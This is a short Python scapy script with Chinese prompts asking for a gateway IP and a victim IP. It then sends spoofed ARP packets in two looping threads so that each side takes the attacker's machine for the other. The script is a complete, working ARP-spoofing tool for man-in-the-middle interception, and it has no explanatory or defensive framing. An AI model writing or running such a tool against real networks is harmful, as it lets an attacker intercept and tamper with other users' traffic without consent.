from scapy.all import *
import threading

a = input("请输入网关的IP地址：")
b = input("请输入被欺骗的IP地址：")
def qpwang(a, b):
    srloop(ARP(psrc=b ,pdst=a))
def qpip(a, b):
    srloop(ARP(psrc=a ,pdst=b))
thre=[]
aa = threading.Thread(target=qpwang, args=((a, b)))
thre.append(aa)
bb = threading.Thread(target=qpip, args=((a, b)))
thre.append(bb)
for i in thre:
    i.setDaemon(True)
    i.start()
for i in thre:
    i.join()